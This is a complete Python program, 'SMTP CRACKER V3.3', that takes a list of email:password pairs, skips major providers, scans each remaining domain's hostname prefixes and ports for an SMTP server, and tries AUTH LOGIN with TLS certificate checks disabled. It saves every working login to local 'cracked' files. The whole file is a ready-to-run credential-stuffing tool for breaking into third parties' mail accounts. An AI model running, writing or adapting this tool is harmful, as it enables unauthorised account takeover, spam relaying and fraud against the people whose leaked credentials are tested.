import os
import sys
import socket
import threading
import base64
import ssl
import time
import queue
from pathlib import Path

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class NoColor:
        def __getattr__(self, name):
            return ""
    Fore = Style = NoColor()


# ──────────────────────────────────────────────
# Globals (thread-safe containers)
# ──────────────────────────────────────────────
cracked   = set()          # emails that have been successfully cracked
bads      = set()          # domains where AUTH LOGIN is not supported
stop_flag = False
file_lock = threading.Lock()
print_lock = threading.Lock()
cache_lock = threading.Lock()
smtp_cache = {}            # domain → (host, port)  shared across threads
processed_count = 0
total_count     = 0


# ──────────────────────────────────────────────
# Config
# ──────────────────────────────────────────────
SKIP_DOMAINS = {
    "gmail.com", "googlemail.com",
    "outlook.com", "hotmail.com", "live.com", "msn.com",
    "hotmail.co.uk", "hotmail.fr", "hotmail.de", "live.fr", "live.de",
    "outlook.fr", "outlook.de", "outlook.co.uk", "live.co.uk",
    "msn.fr", "msn.de", "msn.co.uk",
    "yahoo.com", "ymail.com", "rocketmail.com",
    "yahoo.co.uk", "yahoo.fr", "yahoo.de", "yahoo.es", "yahoo.it",
    "aol.com", "aim.com", "aol.co.uk",
}

# Common prefixes – ordered by likelihood
HOST_PREFIXES = [
    "", "smtp.", "mail.", "webmail.", "secure.", "smtp.mail.", "outgoing.", "smtp-mail.",
    "mx.", "mx1.", "relay.", "mailgate.", "smtp-gateway.", "exchange.", "outbound.", "inbound.",
    "smtp-relay.", "smtp-secure.", "authsmtp.", "plussmtp.", "smtpmail.", "pop3.", "securesmtp.",
    "smtp2.", "smtp3.", "smtp4.", "smtp5.", "smtp-alt.", "smtp-alt1.", "smtp-alt2.",
    "smtp-alt3.", "smtp-alt4.", "smtp-alt5.", "smtp-relay1.", "smtp-relay2.", "smtp-relay3.",
    "smtp-relay4.", "smtp-relay5.", "smtp-relay6.", "smtp-relay7.", "smtp-relay8.",
    "smtp-relay9.", "smtp-relay10.", "smtp-auth.", "smtp-auth1.", "smtp-auth2.",
    "smtp-auth3.", "smtp-auth4.", "smtp-auth5.", "smtp-direct.", "smtp-direct1.",
    "smtp-direct2.", "smtp-direct3.", "smtp-direct4.", "smtp-direct5.", "smtp-direct6.",
    "smtp-direct7.", "smtp-direct8.", "smtp-direct9.", "smtp-direct10.", "smtp-secure1.",
    "smtp-secure2.", "smtp-secure3.", "smtp-secure4.", "smtp-secure5.", "smtp-secure6.",
    "smtp-secure7.", "smtp-secure8.", "smtp-secure9.", "smtp-secure10.", "smtp-test.",
    "smtp-test1.", "smtp-test2.", "smtp-test3.", "smtp-test4.", "smtp-test5.", "smtp-dev.",
    "smtp-dev1.", "smtp-dev2.", "smtp-dev3.", "smtp-dev4.", "smtp-dev5.", "smtp-staging.",
    "smtp-staging1.", "smtp-staging2.", "smtp-staging3.", "smtp-staging4.", "smtp-staging5.",
    "smtp-production.", "smtp-production1.", "smtp-production2.", "smtp-production3.",
    "smtp-production4.", "smtp-production5.", "smtp-bkp.", "smtp-bkp1.", "smtp-bkp2.",
    "smtp-bkp3.", "smtp-bkp4.", "smtp-bkp5.", "smtp-tls.", "smtp-tls1.", "smtp-tls2.",
    "smtp-tls3.", "smtp-tls4.", "smtp-tls5.", "smtp-ssl.", "smtp-ssl1.", "smtp-ssl2.",
    "smtp-ssl3.", "smtp-ssl4.", "smtp-ssl5.", "smtp-internal.", "smtp-internal1.",
    "smtp-internal2.", "smtp-internal3.", "smtp-internal4.", "smtp-internal5.",
    "smtp-external.", "smtp-external1.", "smtp-external2.", "smtp-external3.",
    "smtp-external4.", "smtp-external5.", "smtp-trial.", "smtp-trial1.", "smtp-trial2.",
    "smtp-trial3.", "smtp-trial4.", "smtp-trial5.", "smtp-free.", "smtp-free1.",
    "smtp-free2.", "smtp-free3.", "smtp-free4.", "smtp-free5.", "smtp-custom.",
    "smtp-custom1.", "smtp-custom2.", "smtp-custom3.", "smtp-custom4.", "smtp-custom5.",
    "smtp-prod.", "smtp-prod1.", "smtp-prod2.", "smtp-prod3.", "smtp-prod4.", "smtp-prod5.",
    "smtp-poc.", "smtp-poc1.", "smtp-poc2.", "smtp-poc3.", "smtp-poc4.", "smtp-poc5.",
    "smtp-uat.", "smtp-uat1.", "smtp-uat2.", "smtp-uat3.", "smtp-uat4.", "smtp-uat5.",
    "smtp-demo.", "smtp-demo1.", "smtp-demo2.", "smtp-demo3.", "smtp-demo4.", "smtp-demo5.",
    "smtp-int.", "smtp-int1.", "smtp-int2.", "smtp-int3.", "smtp-int4.", "smtp-int5.",
    "test.", "dev.", "staging.", "prod.", "production.", "internal.", "external.", "demo.",
    "lab.", "qa.", "uat.", "sandbox.", "mail-test.", "mail-dev.", "mail-staging.",
    "mail-prod.", "test-smtp.", "dev-smtp.", "staging-smtp.", "prod-smtp.", "lab-smtp.",
    "qa-smtp.", "uat-smtp.", "demo-smtp.", "sandbox-smtp.", "internal-smtp.", "external-smtp.",
    "server.", "server1.", "server2.", "server3.", "server4.", "server5.",
    "mail1.", "mail2.", "mail3.", "mail4.", "mail5.", "mx2.", "mx3.", "mx4.", "mx5.",
    "mail01.", "mail02.", "mail03.", "mail04.", "mail05.",
    "smtp01.", "smtp02.", "smtp03.", "smtp04.", "smtp05.",
    "mx01.", "mx02.", "mx03.", "mx04.", "mx05.",
]

# Ports ordered by likelihood
PORTS = [
    25, 465, 587, 1025, 2525,
    110, 995, 993, 443,
    500, 502, 26, 588, 589,
    2553, 2560, 2565, 2570, 2580, 2595, 2600,
    2650, 2665, 2670, 2680, 2695, 2700,
    2750, 2765, 2770, 2780, 2795, 2800,
    2850, 2865, 2870, 2880, 2895, 2900,
    2950, 2965, 2970, 2980, 2995, 3000,
    3050, 3065, 3070, 3080, 3095, 3100,
    3150, 3165, 3170, 3180, 3195, 3200,
    3250, 3265, 3270, 3280, 3295, 3300,
    3350, 3365, 3370, 3380, 3395, 3400,
    3450, 3465, 3470, 3480, 3495, 3500,
    3550, 3565, 3570, 3580, 3595, 3600,
    3650, 3665, 3670, 3680, 3695, 3700,
    3750, 3765, 3770, 3780, 3795, 3800,
    3850, 3865, 3870, 3880, 3895, 3900,
    3950, 3965, 3970, 3980, 3995, 4000,
    3306,
]

TIMEOUT = 2
THREAD_COUNT = 25
SOCK_READ_SIZE = 8192


# ──────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────
def should_skip(email: str) -> bool:
    if '@' not in email:
        return True
    domain = email.split('@')[1].lower().strip()
    return domain in SKIP_DOMAINS


def safe_print(msg: str):
    with print_lock:
        print(msg, flush=True)


def safe_write(filename: str, data: str):
    with file_lock:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(data + '\n')


def make_ssl_ctx():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


# ──────────────────────────────────────────────
# SMTP discovery
# ──────────────────────────────────────────────
def probe_smtp(host: str, port: int, timeout: int = TIMEOUT):
    """
    Try to connect and verify the port speaks SMTP (banner starts with 220).
    Returns a connected socket if successful, else None.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        if port == 465:
            ctx = make_ssl_ctx()
            sock = ctx.wrap_socket(sock, server_hostname=host)

        banner = sock.recv(SOCK_READ_SIZE).decode(errors='ignore').strip()
        if banner.startswith('220'):
            sock.close()
            return True
        sock.close()
        return False
    except Exception:
        try:
            sock.close()
        except Exception:
            pass
        return False


def find_smtp(domain: str):
    """
    Find a working SMTP host:port for the given domain.
    Uses a shared cache so multiple threads don't re-scan the same domain.
    """
    global smtp_cache

    # Check cache first
    with cache_lock:
        if domain in smtp_cache:
            return smtp_cache[domain]   # (host, port) or None

    # Scan: prefixes × ports (prefixes inner loop so we try ALL prefixes
    # on port 25 before moving to port 465, etc.)
    for port in PORTS:
        for prefix in HOST_PREFIXES:
            host = prefix + domain
            if probe_smtp(host, port):
                result = (host, port)
                with cache_lock:
                    smtp_cache[domain] = result
                safe_print(f"[DISCOVERED] {domain} → {host}:{port}")
                return result

    # Not found – cache the negative
    with cache_lock:
        smtp_cache[domain] = None
    return None


# ──────────────────────────────────────────────
# SMTP auth attempt
# ──────────────────────────────────────────────
def smtp_login(host, port, email, password):
    """
    Attempt SMTP AUTH LOGIN.
    Handles:
      - Plain TCP  (port 25, 1025, …)
      - STARTTLS   (port 587, 25 if supported)
      - Implicit SSL (port 465)
    Returns True on success, False on failure.
    """
    sock = None
    ctx  = make_ssl_ctx()

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((host, port))

        # ── implicit SSL (465) ──
        if port == 465:
            sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.recv(SOCK_READ_SIZE)          # banner after TLS

        else:
            sock.recv(SOCK_READ_SIZE)          # banner

            # ── try STARTTLS for 587 / 25 ──
            if port in (587, 25, 1025, 2525):
                sock.send(b"EHLO localhost\r\n")
                ehlo_resp = sock.recv(SOCK_READ_SIZE).decode(errors='ignore')
                if 'STARTTLS' in ehlo_resp:
                    sock.send(b"STARTTLS\r\n")
                    resp = sock.recv(SOCK_READ_SIZE).decode(errors='ignore')
                    if resp.startswith('220'):
                        sock = ctx.wrap_socket(sock, server_hostname=host)
                        sock.send(b"EHLO localhost\r\n")
                        sock.recv(SOCK_READ_SIZE)

        # ── AUTH LOGIN ──
        sock.send(b"EHLO localhost\r\n")
        sock.recv(SOCK_READ_SIZE)

        sock.send(b"AUTH LOGIN\r\n")
        resp = sock.recv(SOCK_READ_SIZE).decode(errors='ignore').strip()

        if not resp.startswith('334'):
            return False

        sock.send(base64.b64encode(email.encode()).decode().encode() + b"\r\n")
        resp = sock.recv(SOCK_READ_SIZE).decode(errors='ignore').strip()
        if not resp.startswith('334'):
            return False

        sock.send(base64.b64encode(password.encode()).decode().encode() + b"\r\n")
        resp = sock.recv(SOCK_READ_SIZE).decode(errors='ignore').strip()

        return resp.startswith('235')

    except Exception:
        return False
    finally:
        try:
            if sock:
                sock.close()
        except Exception:
            pass


# ──────────────────────────────────────────────
# Worker thread
# ──────────────────────────────────────────────
class SMTPWorker(threading.Thread):
    def __init__(self, q, tid):
        super().__init__(daemon=True)
        self.q   = q
        self.tid = tid

    def run(self):
        global processed_count

        while not stop_flag:
            try:
                item = self.q.get(timeout=0.5)
            except queue.Empty:
                continue

            if item is None:          # poison pill
                self.q.task_done()
                break

            try:
                self.process(item)
            except Exception as e:
                safe_print(f"[T{self.tid}] Error: {e}")

            self.q.task_done()

    def process(self, item):
        global processed_count

        domain, email, password = item

        with print_lock:
            processed_count += 1
            if processed_count % 100 == 0 or processed_count == total_count:
                remaining = total_count - processed_count
                safe_print(
                    f"  {Fore.CYAN}[PROGRESS]{Fore.RESET} "
                    f"Done: {processed_count}/{total_count}  "
                    f"Left: {remaining}  "
                    f"Cracked: {len(cracked)}"
                )

        # Already cracked this email?
        if email in cracked:
            return

        # Domain known-bad (no AUTH LOGIN anywhere)?
        if domain in bads:
            return

        # Find SMTP endpoint
        server = find_smtp(domain)
        if server is None:
            return

        host, port = server
        safe_print(f"[T{self.tid}] Trying {email} @ {host}:{port}")

        if smtp_login(host, port, email, password):
            # ── CRACKED ──
            cracked.add(email)
            hit_host  = f"{host}:{port}|{email}:{password}"
            hit_plain = f"{email}:{password}"

            safe_print(
                Fore.GREEN + Style.BRIGHT +
                f"\n╔══════════════════════════════════════════════════════════╗\n"
                f"║   CRACKED!  [T{self.tid}]\n"
                f"╠══════════════════════════════════════════════════════════╣\n"
                f"║ Host : {host:<52} ║\n"
                f"║ Port : {port:<52} ║\n"
                f"║ User : {email:<52} ║\n"
                f"║ Pass : {password:<52} ║\n"
                f"╚══════════════════════════════════════════════════════════╝\n"
                + Fore.RESET
            )

            safe_write('cracked_smtps.txt',      hit_host)
            safe_write('cracked_Mailaccess.txt', hit_plain)
        else:
            # Auth failed – not marking domain as bad because
            # the password may just be wrong for THIS account
            pass


# ──────────────────────────────────────────────
# Main
# ──────────────────────────────────────────────
def main():
    global stop_flag, processed_count, total_count

    os.system('cls' if os.name == 'nt' else 'clear')

    print(Fore.CYAN + """
   SMTP CRACKER V3.3 - FIXED
   Skips Google, Microsoft, Yahoo, AOL
""" + Fore.RESET)
    print(Fore.YELLOW + "=" * 60 + Fore.RESET)

    # ── load combos ──
    combo_file = input(Fore.YELLOW + "[+] Combo file name: " + Fore.RESET).strip()

    try:
        lines = Path(combo_file).read_text(encoding='utf-8', errors='ignore').splitlines()
    except (FileNotFoundError, PermissionError, OSError) as e:
        print(Fore.RED + f"[!] Error reading file: {e}")
        input("Press Enter to exit...")
        return

    combos = []
    skipped = 0
    seen   = set()

    for line in lines:
        line = line.strip()
        if ':' not in line:
            continue
        email, pwd = line.split(':', 1)
        email = email.strip().lower()
        pwd   = pwd.strip()

        if '@' not in email or not email or not pwd:
            continue

        if should_skip(email):
            skipped += 1
            continue

        combo_key = f"{email}:{pwd}"
        if combo_key in seen:
            continue
        seen.add(combo_key)

        domain = email.split('@')[1].lower()
        combos.append((domain, email, pwd))

    total_count = len(combos)
    print(Fore.GREEN + f"[+] Loaded {total_count} unique combos "
                       f"(skipped {skipped} big-provider)")
    if not combos:
        print(Fore.RED + "[!] No valid combos after filtering. Exiting.")
        input("Press Enter to exit...")
        return

    # ── fill queue ──
    q = queue.Queue()
    for item in combos:
        q.put(item)

    # ── spawn workers ──
    threads = []
    for i in range(THREAD_COUNT):
        t = SMTPWorker(q, i + 1)
        t.start()
        threads.append(t)

    print(Fore.CYAN + f"\n[+] Started {THREAD_COUNT} threads "
                      f"(timeout={TIMEOUT}s).  Ctrl+C to stop.\n")

    start = time.time()

    # ── wait until done ──
    try:
        # Wait for queue to drain
        q.join()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Stopping...")
        stop_flag = True

    # ── send poison pills ──
    for _ in threads:
        q.put(None)

    for t in threads:
        t.join(timeout=5)

    elapsed = time.time() - start

    print(Fore.CYAN + "\n" + "=" * 60)
    print(Fore.GREEN + f"  Finished in {int(elapsed)}s")
    print(Fore.GREEN + f"  Total cracked : {len(cracked)}")
    print(Fore.GREEN + f"  Results saved : cracked_smtps.txt")
    print(Fore.GREEN + f"                  cracked_Mailaccess.txt")
    print(Fore.YELLOW + f"  Skipped big-provider accounts: {skipped}")
    print(Fore.CYAN + "=" * 60)
    input("\nPress Enter to exit...")


if __name__ == '__main__':
    main()
